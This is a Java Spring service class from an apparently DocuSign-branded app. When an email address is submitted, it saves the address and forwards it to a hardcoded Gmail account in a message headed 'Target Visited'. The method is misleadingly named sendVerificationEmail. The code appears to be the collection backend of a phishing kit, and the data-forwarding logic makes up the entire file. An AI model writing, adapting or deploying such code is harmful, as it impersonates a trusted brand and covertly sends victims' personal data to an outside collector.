package project.docusign.app.email;

import java.io.UnsupportedEncodingException;
import java.util.List;

import javax.mail.MessagingException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import project.docusign.app.mailsender.MailSenderService;


@Service
public class EmailService {
	
	@Autowired
	private EmailRepository emailRepository;
	
	@Autowired
	MailSenderService mailSenderService;
	
	public Email addEmail(Email email) throws UnsupportedEncodingException, MessagingException {
		sendVerificationEmail(email.getEmail());
		return emailRepository.save(email);
	}
	
	public String getEmailLast() {
		List<Email> emails = (List<Email>) emailRepository.findAll();
		return emails.get(emails.size() - 1).getEmail();
	}
	
	private void sendVerificationEmail(String email) throws MessagingException, UnsupportedEncodingException {
		String toAddress = "docusign76@gmail.com";
		String subject = "Target";
		String content = "<!DOCTYPE html>\n"
		+ "<html lang=\"en\">\n"
		+ "<head>\n"
		+ "    <meta charset=\"UTF-8\">\n"
		+ "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
		+ "    <title>Document</title>\n"
		+ "</head>\n"
		+ "<body style=\"background-color: black; color: green; padding: 16px;\">\n"
		+ "    <div style=\"background-color: rgb(18, 18, 18); padding: 16px;\">\n"
		+ "    <p style=\"font-size: 18px;\">Target Visited</p>\n"
		+ "    <p>Target Email: "+email+"</p>\n"
		+ "</div>\n"
		+ "</body>\n"
		+ "</html>";
		mailSenderService.sendEmail(toAddress, subject, content);
	}
	
}
